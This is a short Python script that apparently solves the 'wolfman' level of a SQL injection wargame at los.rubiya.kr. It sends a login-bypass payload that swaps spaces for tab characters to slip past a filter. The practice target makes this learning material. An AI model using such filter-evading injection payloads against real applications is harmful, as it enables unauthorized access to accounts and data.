from constants import *

chall_url = "https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php"

res = make_request(chall_url, "?pw=" + urllib.parse.quote(f"'\tor\tid='admin'\t--\t-"))
check_clear(res)
